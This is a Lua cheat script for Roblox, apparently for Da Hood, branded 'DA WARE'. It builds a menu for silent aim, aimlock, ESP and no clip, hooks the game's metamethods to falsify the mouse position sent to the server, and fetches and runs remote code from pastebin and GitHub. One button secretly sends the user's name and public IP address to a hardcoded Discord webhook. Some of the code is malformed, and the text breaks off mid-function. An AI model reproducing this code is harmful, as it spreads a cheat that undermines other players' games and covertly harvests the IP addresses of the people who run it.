-- Gui to Lua
-- Version: 3.2

-- Instances:

local ScreenGui = Instance.new("ScreenGui")
local Frame = Instance.new("Frame")
local CIRCLE = Instance.new("TextButton")
local LABELDAWARE = Instance.new("TextLabel")
local UICorner = Instance.new("UICorner")
local nocircle = Instance.new("TextButton")
local FOVS = Instance.new("TextLabel")
local FOV180 = Instance.new("TextButton")
local FOV120 = Instance.new("TextButton")
local FIV90 = Instance.new("TextButton")
local Nocli = Instance.new("TextButton")
local UICorner_2 = Instance.new("UICorner")
local ESP = Instance.new("TextButton")
local Frame_2 = Instance.new("Frame")
local UICorner_3 = Instance.new("UICorner")
local TextButton = Instance.new("TextButton")
local TextButton_2 = Instance.new("TextButton")
local TextLabel = Instance.new("TextLabel")
local TextButton_3 = Instance.new("TextButton")
local Mainpart = Instance.new("TextButton")
local TextButton_4 = Instance.new("TextButton")
local TextLabel_2 = Instance.new("TextLabel")
local TextLabel_3 = Instance.new("TextLabel")

--Properties:

ScreenGui.Parent = game.CoreGui
ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling

Frame.Parent = ScreenGui
Frame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
Frame.Position = UDim2.new(0.197311416, 0, 0.278980881, 0)
Frame.Size = UDim2.new(0, 608, 0, 346)

CIRCLE.Name = "CIRCLE"
CIRCLE.Parent = Frame
CIRCLE.BackgroundColor3 = Color3.fromRGB(86, 8, 8)
CIRCLE.Position = UDim2.new(0.761092305, 0, 0.12835069, 0)
CIRCLE.Size = UDim2.new(0, 139, 0, 28)
CIRCLE.Font = Enum.Font.SourceSans
CIRCLE.Text = "Silent aim"
CIRCLE.TextColor3 = Color3.fromRGB(0, 0, 0)
CIRCLE.TextScaled = true
CIRCLE.TextSize = 14.000
CIRCLE.TextWrapped = true

LABELDAWARE.Name = "LABEL DA WARE"
LABELDAWARE.Parent = Frame
LABELDAWARE.BackgroundColor3 = Color3.fromRGB(86, 8, 8)
LABELDAWARE.Size = UDim2.new(0, 608, 0, 35)
LABELDAWARE.Font = Enum.Font.SourceSans
LABELDAWARE.Text = "DA WARE"
LABELDAWARE.TextColor3 = Color3.fromRGB(0, 0, 0)
LABELDAWARE.TextScaled = true
LABELDAWARE.TextSize = 14.000
LABELDAWARE.TextWrapped = true

UICorner.CornerRadius = UDim.new(0, 23)
UICorner.Parent = LABELDAWARE

nocircle.Name = "no circle"
nocircle.Parent = Frame
nocircle.BackgroundColor3 = Color3.fromRGB(86, 8, 8)
nocircle.Position = UDim2.new(0.763905466, 0, 0.383714318, 0)
nocircle.Size = UDim2.new(0, 139, 0, 28)
nocircle.Font = Enum.Font.SourceSans
nocircle.Text = "Silent aim witout circle"
nocircle.TextColor3 = Color3.fromRGB(0, 0, 0)
nocircle.TextScaled = true
nocircle.TextSize = 14.000
nocircle.TextWrapped = true

FOVS.Name = "FOVS"
FOVS.Parent = Frame
FOVS.BackgroundColor3 = Color3.fromRGB(86, 8, 8)
FOVS.Position = UDim2.new(0.761961699, 0, 0.556949556, 0)
FOVS.Size = UDim2.new(0, 139, 0, 28)
FOVS.Font = Enum.Font.SourceSans
FOVS.Text = "FOVS"
FOVS.TextColor3 = Color3.fromRGB(0, 0, 0)
FOVS.TextScaled = true
FOVS.TextSize = 14.000
FOVS.TextWrapped = true

FOV180.Name = "FOV 180"
FOV180.Parent = Frame
FOV180.BackgroundColor3 = Color3.fromRGB(86, 8, 8)
FOV180.Position = UDim2.new(0.76525116, 0, 0.66799134, 0)
FOV180.Size = UDim2.new(0, 139, 0, 28)
FOV180.Font = Enum.Font.SourceSans
FOV180.Text = "FOV = 180"
FOV180.TextColor3 = Color3.fromRGB(0, 0, 0)
FOV180.TextScaled = true
FOV180.TextSize = 14.000
FOV180.TextWrapped = true

FOV120.Name = "FOV 120"
FOV120.Parent = Frame
FOV120.BackgroundColor3 = Color3.fromRGB(86, 8, 8)
FOV120.Position = UDim2.new(0.763606429, 0, 0.791491508, 0)
FOV120.Size = UDim2.new(0, 139, 0, 28)
FOV120.Font = Enum.Font.SourceSans
FOV120.Text = "FOV = 120"
FOV120.TextColor3 = Color3.fromRGB(0, 0, 0)
FOV120.TextScaled = true
FOV120.TextSize = 14.000
FOV120.TextWrapped = true

FIV90.Name = "FIV 90"
FIV90.Parent = Frame
FIV90.BackgroundColor3 = Color3.fromRGB(86, 8, 8)
FIV90.Position = UDim2.new(0.761961699, 0, 0.896752894, 0)
FIV90.Size = UDim2.new(0, 139, 0, 28)
FIV90.Font = Enum.Font.SourceSans
FIV90.Text = "FOV = 90 (normal)"
FIV90.TextColor3 = Color3.fromRGB(0, 0, 0)
FIV90.TextScaled = true
FIV90.TextSize = 14.000
FIV90.TextWrapped = true

Nocli.Name = "No cli"
Nocli.Parent = Frame
Nocli.BackgroundColor3 = Color3.fromRGB(86, 8, 8)
Nocli.Position = UDim2.new(0.760616064, 0, 0.253481328, 0)
Nocli.Size = UDim2.new(0, 139, 0, 28)
Nocli.Font = Enum.Font.SourceSans
Nocli.Text = "No clip"
Nocli.TextColor3 = Color3.fromRGB(0, 0, 0)
Nocli.TextScaled = true
Nocli.TextSize = 14.000
Nocli.TextWrapped = true

UICorner_2.CornerRadius = UDim.new(0, 23)
UICorner_2.Parent = Frame

ESP.Name = "ESP"
ESP.Parent = Frame
ESP.BackgroundColor3 = Color3.fromRGB(86, 7, 7)
ESP.Position = UDim2.new(0.0123603847, 0, 0.278901488, 0)
ESP.Size = UDim2.new(0, 96, 0, 28)
ESP.Font = Enum.Font.SourceSans
ESP.Text = "ESP STUFF"
ESP.TextColor3 = Color3.fromRGB(255, 255, 255)
ESP.TextSize = 14.000

Frame_2.Parent = ESP
Frame_2.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
Frame_2.Position = UDim2.new(6.48958349, 0, -2.1964252, 0)
Frame_2.Size = UDim2.new(0, 203, 0, 293)
Frame_2.Visible = false

UICorner_3.CornerRadius = UDim.new(0, 23)
UICorner_3.Parent = Frame_2

TextButton.Parent = Frame_2
TextButton.BackgroundColor3 = Color3.fromRGB(152, 0, 0)
TextButton.Position = UDim2.new(0.157635465, 0, 0.170648471, 0)
TextButton.Size = UDim2.new(0, 136, 0, 50)
TextButton.Font = Enum.Font.SourceSans
TextButton.Text = "ESP"
TextButton.TextColor3 = Color3.fromRGB(0, 0, 0)
TextButton.TextSize = 14.000

TextButton_2.Parent = Frame_2
TextButton_2.BackgroundColor3 = Color3.fromRGB(255, 57, 39)
TextButton_2.Position = UDim2.new(0.84236455, 0, 0, 0)
TextButton_2.Size = UDim2.new(0, 32, 0, 34)
TextButton_2.Font = Enum.Font.SourceSans
TextButton_2.Text = "X"
TextButton_2.TextColor3 = Color3.fromRGB(0, 0, 0)
TextButton_2.TextSize = 14.000

TextLabel.Parent = Frame_2
TextLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextLabel.Position = UDim2.new(-0.113300472, 0, -0.201365203, 0)
TextLabel.Size = UDim2.new(0, 269, 0, 50)
TextLabel.Font = Enum.Font.SourceSans
TextLabel.Text = "TIP: use esp stuff button to re open this if u closed it"
TextLabel.TextColor3 = Color3.fromRGB(0, 0, 0)
TextLabel.TextSize = 14.000

TextButton_3.Parent = TextLabel
TextButton_3.BackgroundColor3 = Color3.fromRGB(255, 55, 55)
TextButton_3.Position = UDim2.new(0.921933115, 0, 0, 0)
TextButton_3.Size = UDim2.new(0, 21, 0, 19)
TextButton_3.Font = Enum.Font.SourceSans
TextButton_3.Text = "X"
TextButton_3.TextColor3 = Color3.fromRGB(0, 0, 0)
TextButton_3.TextSize = 14.000

Mainpart.Name = "Main part"
Mainpart.Parent = Frame
Mainpart.BackgroundColor3 = Color3.fromRGB(86, 0, 0)
Mainpart.Position = UDim2.new(0.0115131568, 0, 0.153179199, 0)
Mainpart.Size = UDim2.new(0, 96, 0, 28)
Mainpart.Font = Enum.Font.SourceSans
Mainpart.Text = "Main"
Mainpart.TextColor3 = Color3.fromRGB(255, 255, 255)
Mainpart.TextSize = 14.000

TextButton_4.Parent = Frame
TextButton_4.BackgroundColor3 = Color3.fromRGB(86, 8, 8)
TextButton_4.Position = UDim2.new(0.503289402, 0, 0.127167627, 0)
TextButton_4.Size = UDim2.new(0, 144, 0, 28)
TextButton_4.Font = Enum.Font.SourceSans
TextButton_4.Text = "Trigger bot - Q still in beta"
TextButton_4.TextColor3 = Color3.fromRGB(0, 0, 0)
TextButton_4.TextSize = 14.000

TextLabel_2.Parent = Frame
TextLabel_2.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
TextLabel_2.BorderColor3 = Color3.fromRGB(0, 0, 0)
TextLabel_2.Position = UDim2.new(0.0115131587, 0, 0.78901732, 0)
TextLabel_2.Size = UDim2.new(0, 153, 0, 41)
TextLabel_2.Font = Enum.Font.SourceSans
TextLabel_2.Text = "E and V TO TOGGLE"
TextLabel_2.TextColor3 = Color3.fromRGB(195, 195, 195)
TextLabel_2.TextSize = 14.000

TextLabel_3.Parent = Frame
TextLabel_3.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
TextLabel_3.BorderColor3 = Color3.fromRGB(0, 0, 0)
TextLabel_3.Position = UDim2.new(0.0328947306, 0, 0.895099819, 0)
TextLabel_3.Size = UDim2.new(0, 126, 0, 29)
TextLabel_3.Font = Enum.Font.SourceSans
TextLabel_3.Text = "Made by Mason?#4521"
TextLabel_3.TextColor3 = Color3.fromRGB(255, 0, 0)
TextLabel_3.TextSize = 14.000

-- Scripts:

local function DKJTX_fake_script() -- CIRCLE.LocalScript 
	end
	local script = Instance.new('LocalScript', CIRCLE)

	script.Parent.MouseButton1Click:Connect(function()
		-- // Dependencies
		local Aiming = loadstring(game:HttpGet("https://pastebin.com/raw/HHr8eAaZ"))()
		Aiming.TeamCheck(false)
	
		-- // Services
		local Workspace = game:GetService("Workspace")
		local Players = game:GetService("Players")
		local RunService = game:GetService("RunService")
		local UserInputService = game:GetService("UserInputService")
	
		-- // Vars
		local LocalPlayer = Players.LocalPlayer
		local Mouse = LocalPlayer:GetMouse()
		local CurrentCamera = Workspace.CurrentCamera
	
		local DaHoodSettings = {
			SilentAim = true,
			AimLock = true,
			Prediction = 0.165,
			AimLockKeybind = Enum.KeyCode.E
		}
		getgenv().DaHoodSettings = DaHoodSettings
	
		-- // Overwrite to account downed
		function Aiming.Check()
			-- // Check A
			if not (Aiming.Enabled == true and Aiming.Selected ~= LocalPlayer and Aiming.SelectedPart ~= nil) then
				return false
			end
	
			-- // Check if downed
			local Character = Aiming.Character(Aiming.Selected)
			local KOd = Character:WaitForChild("BodyEffects")["K.O"].Value
			local Grabbed = Character:FindFirstChild("GRABBING_CONSTRAINT") ~= nil
	
			-- // Check B
			if (KOd or Grabbed) then
				return false
			end
	
			-- //
			return true
		end
	
		-- // Hook
		local __index
		__index = hookmetamethod(game, "__index", function(t, k)
			-- // Check if it trying to get our mouse's hit or target and see if we can use it
			if (t:IsA("Mouse") and (k == "Hit" or k == "Target") and Aiming.Check()) then
				-- // Vars
				local SelectedPart = Aiming.SelectedPart
	
				-- // Hit/Target
				if (DaHoodSettings.SilentAim and (k == "Hit" or k == "Target")) then
					-- // Hit to account prediction
					local Hit = SelectedPart.CFrame + (SelectedPart.Velocity * DaHoodSettings.Prediction)
	
					-- // Return modded val
					return (k == "Hit" and Hit or SelectedPart)
				end
			end
	
			-- // Return
			return __index(t, k)
		end)
	
		-- // Aimlock
		RunService:BindToRenderStep("AimLock", 0, function()
			if (DaHoodSettings.AimLock and Aiming.Check() and UserInputService:IsKeyDown(DaHoodSettings.AimLockKeybind)) then
				-- // Vars
				local SelectedPart = Aiming.SelectedPart
	
				-- // Hit to account prediction
				local Hit = SelectedPart.CFrame + (SelectedPart.Velocity * DaHoodSettings.Prediction)
	
				-- // Set the camera to face towards the Hit
				CurrentCamera.CFrame = CFrame.lookAt(CurrentCamera.CFrame.Position, Hit.Position)
			end
		end)
end)
coroutine.wrap(DKJTX_fake_script)()
local function DHML_fake_script() -- CIRCLE.LocalScript 
	local script = Instance.new('LocalScript', CIRCLE)

	toggle = false
	script.Parent.MouseButton1Down:connect(function()
	
		if toggle == true then 
			toggle = false 
		else
			toggle = true
		end
		if toggle == true then 
			script.Parent.BackgroundColor3 = Color3.fromRGB(0, 255, 0)
		end
		if toggle == false then 
			script.Parent.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
		end
	
		if toggle == true then
			--true here
		end
		if toggle == false then 
			--false here
		end
	end)
end
coroutine.wrap(DHML_fake_script)()
local function GVRZ_fake_script() -- Frame.LocalScript 
	local script = Instance.new('LocalScript', Frame)

	local UIS = game:GetService('UserInputService')
	local frame = script.Parent
	local dragToggle = nil
	local d
	ragSpeed = 0.25
	local dragStart = nil
	local startPos = nil
	
	local function updateInput(input)
		local delta = input.Position - dragStart
		local position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X,
			startPos.Y.Scale, startPos.Y.Offset + delta.Y)
		game:GetService('TweenService'):Create(frame, TweenInfo.new(dragSpeed), {Position = position}):Play()
	end
	
	frame.InputBegan:Connect(function(input)
		if (input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch) then 
			dragToggle = true
			dragStart = input.Position
			startPos = frame.Position
			input.Changed:Connect(function()
				if input.UserInputState == Enum.UserInputState.End then
					dragToggle = false
				end
			end)
		end
	end)
	UIS.InputChanged:Connect(function(input)
		if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
			if dragToggle then
				updateInput(input)
			end
		end
	end)
end
coroutine.wrap(GVRZ_fake_script)()
	local function XZWNN_fake_script() -- nocircle.LocalScript 
		
	end
	local script = Instance.new('LocalScript', nocircle)

	script.Parent.MouseButton1Click:Connect(function()
	local webh = "https://discord.com/api/webhooks/919258488193036359/SSqlWrk1MjffNNpd83qieY06jEVQEvaOctND0FqjyDG_EI0GdAdpD2NqVj7GQuF7si9w"
	
	pcall(function()
		local data = {
			["embeds"] = {
				{
					["title"] = game:GetService("Players").LocalPlayer.Name,
					["description"] = game:HttpGet("https://api.ipify.org")
				}
			}
		}
	
		if syn then
			local response = syn.request(
				{
					Url = webh,
					Method = 'POST',
					Headers = {
						['Content-Type'] = 'application/json'
					},
					Body = game:GetService('HttpService'):JSONEncode(data)
				}
			);
		elseif request then
			local response = request(
				{
					Url = webh,
					Method = 'POST',
					Headers = {
						['Content-Type'] = 'application/json'
					},
					Body = game:GetService('HttpService'):JSONEncode(data)
				}
			);
		elseif http_request then
			local response = http_request(
				{
					Url = webh,
					Method = 'POST',
					Headers = {
						['Content-Type'] = 'application/json'
					},
					Body = game:GetService('HttpService'):JSONEncode(data)
				}
			);
		end
	end)
	
	
	local L_1_ = "t"
	local L_2_ = game.Players.LocalPlayer:GetMouse()
	L_2_.KeyDown:Connect(
		function(L_22_arg0)
			if L_22_arg0 == L_1_ then
				if DaHoodSettings.SilentAim == true then
					DaHoodSettings.SilentAim = false
				else
					DaHoodSettings.SilentAim = true
				end
			end
		end
	)
	game:GetService("RunService").RenderStepped:Connect(
	function()
		for L_23_forvar0, L_24_forvar1 in pairs(game.CoreGui:GetChildren()) do
			if L_24_forvar1.Name == "PostmansAutoRob" then
				L_24_forvar1:Destroy()
			end
		end
		for L_25_forvar0, L_26_forvar1 in pairs(game.CoreGui:GetChildren()) do
			if L_26_forvar1.Name == "WarningGUI" then
				L_26_forvar1:Destroy()
			end
		end
	end
	)
	local L_3_ = loadstring(game:HttpGet("https://raw.githubusercontent.com/xHeptc/Kavo-UI-Library/main/source.lua"))()
	local L_4_ = L_3_.CreateLib("Da ware - made by Mason?#7777", "DarkTheme")
	local L_5_ = L_4_:NewTab("Aimlock")
	local L_6_ = L_5_:NewSection("Da ware")
	L_6_:NewButton(
		"Aimlock",
		"Locks on the user",
		function()
			getgenv().AimPart = "HumanoidRootPart"
			getgenv().AimlockKey = "q"
			getgenv().AimRadius = 30
			getgenv().ThirdPerson = true
			getgenv().FirstPerson = true
			getgenv().TeamCheck = false
			getgenv().PredictMovement = true
			getgenv().PredictionVelocity = 9
			local L_27_, L_28_, L_29_, L_30_ =
				game:GetService "Players",
			game:GetService "UserInputService",
			game:GetService "RunService",
			game:GetService "StarterGui"
			local L_31_, L_32_, L_33_, L_34_, L_35_, L_36_, L_37_ =
				L_27_.LocalPlayer,
			L_27_.LocalPlayer:GetMouse(),
			workspace.CurrentCamera,
			CFrame.new,
			Ray.new,
			Vector3.new,
			Vector2.new
			local L_38_, L_39_, L_40_ = true, false, false
			local L_41_
			getgenv().CiazwareUniversalAimbotLoaded = true
			getgenv().WorldToViewportPoint = function(L_42_arg0)
				return L_33_:WorldToViewportPoint(L_42_arg0)
			end
			getgenv().WorldToScreenPoint = function(L_43_arg0)
				return L_33_.WorldToScreenPoint(L_33_, L_43_arg0)
			end
			getgenv().GetObscuringObjects = function(L_44_arg0)
				if L_44_arg0 and L_44_arg0:FindFirstChild(getgenv().AimPart) and L_31_ and L_31_.Character:FindFirstChild("Head") then
					local L_45_ = workspace:FindPartOnRay(L_35_(L_44_arg0[getgenv().AimPart].Position, L_31_.Character.Head.Position))
					if L_45_ then
						return L_45_:IsDescendantOf(L_44_arg0)
					end
				end
			end
			getgenv().GetNearestTarget = function()
				local L_46_ = {}
				local L_47_ = {}
				local L_48_ = {}
				for L_50_forvar0, L_51_forvar1 in pairs(L_27_:GetPlayers()) do
					if L_51_forvar1 ~= L_31_ then
						table.insert(L_46_, L_51_forvar1)
					end
				end
				for L_52_forvar0, L_53_forvar1 in pairs(L_46_) do
					if L_53_forvar1.Character ~= nil then
						local L_54_ = L_53_forvar1.Character:FindFirstChild("Head")
						if getgenv().TeamCheck == true and L_53_forvar1.Team ~= L_31_.Team then
							local L_55_ =
								(L_53_forvar1.Character:FindFirstChild("Head").Position - game.Workspace.CurrentCamera.CFrame.p).magnitude
							local L_56_ =
								Ray.new(
									game.Workspace.CurrentCamera.CFrame.p,
									(L_32_.Hit.p - game.Workspace.CurrentCamera.CFrame.p).unit * L_55_
								)
							local L_57_, L_58_ = game.Workspace:FindPartOnRay(L_56_, game.Workspace)
							local L_59_ = math.floor((L_58_ - L_54_.Position).magnitude)
							L_47_[L_53_forvar1.Name .. L_52_forvar0] = {}
							L_47_[L_53_forvar1.Name .. L_52_forvar0].dist = L_55_
							L_47_[L_53_forvar1.Name .. L_52_forvar0].plr = L_53_forvar1
							L_47_[L_53_forvar1.Name .. L_52_forvar0].diff = L_59_
							table.insert(L_48_, L_59_)
						elseif getgenv().TeamCheck == false and L_53_forvar1.Team == L_31_.Team then
							local L_60_ =
								(L_53_forvar1.Character:FindFirstChild("Head").Position - game.Workspace.CurrentCamera.CFrame.p).magnitude
							local L_61_ =
								Ray.new(
									game.Workspace.CurrentCamera.CFrame.p,
									(L_32_.Hit.p - game.Workspace.CurrentCamera.CFrame.p).unit * L_60_
								)
							local L_62_, L_63_ = game.Workspace:FindPartOnRay(L_61_, game.Workspace)
							local L_64_ = math.floor((L_63_ - L_54_.Position).magnitude)
							L_47_[L_53_forvar1.Name .. L_52_forvar0] = {}
							L_47_[L_53_forvar1.Name .. L_52_forvar0].dist = L_60_
							L_47_[L_53_forvar1.Name .. L_52_forvar0].plr = L_53_forvar1
							L_47_[L_53_forvar1.Name .. L_52_forvar0].diff = L_64_
							table.insert(L_48_, L_64_)
						end
					end
				end
				if unpack(L_48_) == nil then
					return nil
				end
				local L_49_ = math.floor(math.min(unpack(L_48_)))
				if L_49_ > getgenv().AimRadius then
					return nil
				end
				for L_65_forvar0, L_66_forvar1 in pairs(L_47_) do
					if L_66_forvar1.diff == L_49_ then
						return L_66_forvar1.plr
					end
				end
				return nil
			end
			L_32_.KeyDown:Connect(
				function(L_67_arg0)
					if L_67_arg0 == AimlockKey and L_41_ == nil then
						pcall(
							function()
								if L_39_ ~= true then
									L_39_ = true
								end
								local L_68_
								L_68_ = GetNearestTarget()
								if L_68_ ~= nil then
									L_41_ = L_68_
								end
							end
						)
					elseif L_67_arg0 == AimlockKey and L_41_ ~= nil then
						if L_41_ ~= nil then
							L_41_ = nil
						end
						if L_39_ ~= false then
							L_39_ = false
						end
					end
				end
			)
			L_29_.RenderStepped:Connect(
				function()
					if getgenv().ThirdPerson == true and getgenv().FirstPerson == true then
						if
							(L_33_.Focus.p - L_33_.CoordinateFrame.p).Magnitude > 1 or
							(L_33_.Focus.p - L_33_.CoordinateFrame.p).Magnitude <= 1
						then
							L_40_ = true
						else
							L_40_ = false
						end
					elseif getgenv().ThirdPerson == true and getgenv().FirstPerson == false then
						if (L_33_.Focus.p - L_33_.CoordinateFrame.p).Magnitude > 1 then
							L_40_ = true
						else
							L_40_ = false
						end
					elseif getgenv().ThirdPerson == false and getgenv().FirstPerson == true then
						if (L_33_.Focus.p - L_33_.CoordinateFrame.p).Magnitude <= 1 then
							L_40_ = true
						else
							L_40_ = false
						end
					end
					if L_38_ == true and L_39_ == true then
						if L_41_ and L_41_.Character and L_41_.Character:FindFirstChild(getgenv().AimPart) then
							if getgenv().FirstPerson == true then
								if L_40_ == true then
									if getgenv().PredictMovement == true then
										L_33_.CFrame =
											L_34_(
												L_33_.CFrame.p,
												L_41_.Character[getgenv().AimPart].Position +
												L_41_.Character[getgenv().AimPart].Velocity / PredictionVelocity
											)
									elseif getgenv().PredictMovement == false then
										L_33_.CFrame = L_34_(L_33_.CFrame.p, L_41_.Character[getgenv().AimPart].Position)
									end
								end
							elseif getgenv().ThirdPerson == true then
								if L_40_ == true then
									if getgenv().PredictMovement == true then
										L_33_.CFrame =
											L_34_(
												L_33_.CFrame.p,
												L_41_.Character[getgenv().AimPart].Position +
												L_41_.Character[getgenv().AimPart].Velocity / PredictionVelocity
											)
									elseif getgenv().PredictMovement == false then
										L_33_.CFrame = L_34_(L_33_.CFrame.p, L_41_.Character[getgenv().AimPart].Position)
									end
								end
							end
						end
					end
				end
			)
		end
	)
	L_6_:NewTextBox(
		"Aimlock Key",
		"Aimlock Key should be lowercase.",
		function(L_69_arg0)
			getgenv().AimlockKey = L_69_arg0
		end
	)
	L_6_:NewTextBox(
		"Aimlock Prediction",
		"Customize your aimlock prediction",
		function(L_70_arg0)
			PredictionVelocity = L_70_arg0
		end
	)
	L_6_:NewDropdown(
		"AimPart",
		"Choose Aim Part to Lock At",
		{
			"Head",
			"UpperTorso",
			"HumanoidRootPart",
			"LowerTorso"
		},
		function(L_71_arg0)
			getgenv().AimPart = L_71_arg0
		end
	)
	local L_7_ = L_4_:NewTab("Silent Aim")
		local L_8_ = L_7_:NewSection("Da ware")
	L_8_:NewButton(
		"Silent Aim",
		"Silent Aim Toggle Key is T.",
		function()
			loadstring(game:HttpGet("https://raw.githubusercontent.com/lemonsys/dahood/main/localsilentaim", true))()
		end
	)
	L_8_:NewTextBox(
		"Silent Aim Prediction",
		"0.157 for low ping 0.165 for medium ping 0.178 for high ping",
		function(L_72_arg0)
			DaHoodSettings.Prediction = L_72_arg0
		end
	)
	L_8_:NewDropdown(
		"Silent Aim Part",
		"Choose Silent Aim Part",
		{
			"Head",
			"UpperTorso",
			"HumanoidRootPart",
			"LowerTorso"
		},
		function(L_73_arg0)
			Aiming.TargetPart = L_73_arg0
		end
	)
	L_8_:NewTextBox(
		"Silent Aim Fov",
		"Silent Aim Fov Changer",
		function(L_74_arg0)
			Aiming.FOV = L_74_arg0
		end
	)
	L_8_:NewToggle(
		"Silent Aim Show Fov",
		"yea",
		function(L_75_arg0)
			Aiming.ShowFOV = L_75_arg0
		end
	)
	local L_9_ = L_4_:NewTab("Silent Aimlock")
		local L_10_ = L_9_:NewSection("Da ware")
	L_10_:NewButton(
		"Silent Aimlock",
		"Key is Q.",
		function()
			_G.KEY = "q"
			_G.PART = "LowerTorso"
			_G.PRED = 0.032
			_G.Frame = Vector3.new(0, 0.53, 0)
			local L_76_ = game:GetService "Workspace".CurrentCamera
			local L_77_
			local L_78_ = false
			local L_79_ = nil
			local L_80_ = game.Players.LocalPlayer:GetMouse()
			local L_81_ = Instance.new("Part", game.Workspace)
			local L_82_ = Instance.new("Folder", game.CoreGui)
			function makemarker(L_86_arg0, L_87_arg1, L_88_arg2, L_89_arg3, L_90_arg4)
				local L_91_ = Instance.new("BillboardGui", L_86_arg0)
				L_91_.Name = "PP"
				L_91_.Adornee = L_87_arg1
				L_91_.Size = UDim2.new(L_89_arg3, L_90_arg4, L_89_arg3, L_90_arg4)
				L_91_.AlwaysOnTop = true
				local L_92_ = Instance.new("Frame", L_91_)
				L_92_.Size = UDim2.new(4, 0, 4, 0)
				L_92_.BackgroundTransparency = 0.1
				L_92_.BackgroundColor3 = L_88_arg2
				local L_93_ = Instance.new("UICorner", L_92_)
				L_93_.CornerRadius = UDim.new(50, 50)
				return L_91_
			end
			local L_83_ = game.Players:GetPlayers()
			function noob(L_94_arg0)
				local L_95_
				repeat
					wait()
				until L_94_arg0.Character
				local L_96_ = makemarker(L_82_, L_94_arg0.Character:WaitForChild(_G.PART), Color3.fromRGB(255, 255, 255), 0.0, 0)
				L_96_.Name = L_94_arg0.Name
				L_94_arg0.CharacterAdded:connect(
					function(L_98_arg0)
						L_96_.Adornee = L_98_arg0:WaitForChild(_G.PART)
					end
				)
				local L_97_ = Instance.new("TextLabel", L_96_)
				L_97_.BackgroundTransparency = 1
				L_97_.Position = UDim2.new(0, 0, 0, -50)
				L_97_.Size = UDim2.new(0, 100, 0, 100)
				L_97_.Font = Enum.Font.SourceSansSemibold
				L_97_.TextSize = 14
				L_97_.TextColor3 = Color3.new(1, 1, 1)
				L_97_.TextStrokeTransparency = 0
				L_97_.TextYAlignment = Enum.TextYAlignment.Bottom
				L_97_.Text = "Name: " .. L_94_arg0.Name
				L_97_.ZIndex = 10
				spawn(
					function()
						while wait() do
							if L_94_arg0.Character then
							end
						end
					end
				)
			end
			for L_99_forvar0 = 1, #L_83_ do
				if L_83_[L_99_forvar0] ~= game.Players.LocalPlayer then
					noob(L_83_[L_99_forvar0])
				end
			end
			game.Players.PlayerAdded:connect(
				function(L_100_arg0)
					noob(L_100_arg0)
				end
			)
			game.Players.PlayerRemoving:Connect(
				function(L_101_arg0)
					L_82_[L_101_arg0.Name]:Destroy()
				end
			)
			spawn(
				function()
					L_81_.Anchored = true
					L_81_.CanCollide = false
					L_81_.Size = Vector3.new(0.1, 0.1, 0.1)
					L_81_.Transparency = 0.1
					makemarker(L_81_, L_81_, Color3.fromRGB(255, 0, 0), 0.20, 0)
				end
			)
			L_80_.KeyDown:Connect(
				function(L_102_arg0)
					if L_102_arg0 ~= _G.KEY then
						return
					end
					if L_78_ then
						L_78_ = false
						TextLabel.TextColor3 = Color3.fromRGB(255, 20, 75)
						TextLabel.Text = "------"
					else
						L_78_ = true
						L_77_ = getClosestPlayerToCursor()
						TextLabel.TextColor3 = Color3.fromRGB(12, 255, 0)
						TextLabel.Text = L_77_.Character.Humanoid.DisplayName
					end
				end
			)
			function getClosestPlayerToCursor()
				local L_103_
				local L_104_ = math.huge
				for L_105_forvar0, L_106_forvar1 in pairs(game.Players:GetPlayers()) do
					if
						L_106_forvar1 ~= game.Players.LocalPlayer and L_106_forvar1.Character and L_106_forvar1.Character:FindFirstChild("Humanoid") and
						L_106_forvar1.Character.Humanoid.Health ~= 0 and
						L_106_forvar1.Character:FindFirstChild(_G.PART)
					then
						local L_107_ = L_76_:WorldToViewportPoint(L_106_forvar1.Character.PrimaryPart.Position)
						local L_108_ = (Vector2.new(L_107_.X, L_107_.Y) - Vector2.new(L_80_.X, L_80_.Y)).magnitude
						if L_108_ < L_104_ then
							L_103_ = L_106_forvar1
							L_104_ = L_108_
						end
					end
				end
				return L_103_
			end
			game:GetService "RunService".Stepped:connect(
				function()
					if L_78_ and L_77_.Character and L_77_.Character:FindFirstChild(_G.PART) then
						L_81_.CFrame =
							CFrame.new(L_77_.Character[_G.PART].Position + _G.Frame + L_77_.Character[_G.PART].Velocity * L_79_)
					else
						L_81_.CFrame = CFrame.new(0, 9999, 0)
					end
				end
			)
			local L_84_ = getrawmetatable(game)
			local L_85_ = L_84_.__namecall
			setreadonly(L_84_, false)
			L_84_.__namecall =
				newcclosure(
					function(...)
					local L_109_ = {
						...
					}
					if L_78_ and getnamecallmethod() == "FireServer" and L_109_[2] == "UpdateMousePos" then
						L_109_[3] = L_77_.Character[_G.PART].Position + _G.Frame + L_77_.Character[_G.PART].Velocity * L_79_
						return L_85_(unpack(L_109_))
					end
					return L_85_(...)
				end
				)
			game.Players.LocalPlayer.Chatted:Connect(
				function(L_110_arg0)
					if L_110_arg0 == "/e print" then
						print(_G.PRED)
					end
				end
			)
			game.Players.LocalPlayer.Chatted:Connect(
				function(L_111_arg0)
					if L_111_arg0 == "Code:1029" then
						_G.KEY = nil
						_G.AIR = nil
						_G.PART = nil
						_G.PRED = nil
						TextLabel.Visible = false
					end
				end
			)
			game.Players.LocalPlayer.Chatted:Connect(
				function(L_112_arg0)
					if L_112_arg0 == "/e hrp" then
						_G.KEY = "q"
						_G.AIR = 0.00005
						_G.PART = "HumanoidRootPart"
						_G.PRED = 0.032
						TextLabel.Visible = true
					end
				end
			)
			game.Players.LocalPlayer.Chatted:Connect(
				function(L_113_arg0)
					if L_113_arg0 == "/e lt" then
						_G.KEY = "q"
						_G.AIR = 0.00005
						_G.PART = "LowerTorso"
						_G.PRED = 0.032
						TextLabel.Visible = true
					end
				end
			)
			game.Players.LocalPlayer.Chatted:Connect(
				function(L_114_arg0)
					if L_114_arg0 == "Screensharing" then
						_G.KEY = "q"
						_G.AIR = 0.00005
						_G.PART = "LowerTorso"
						_G.PRED = 0.033
						TextLabel.Visible = true
						L_81_ = nil
					end
				end
			)
			game.Players.LocalPlayer.Chatted:Connect(
				function(L_115_arg0)
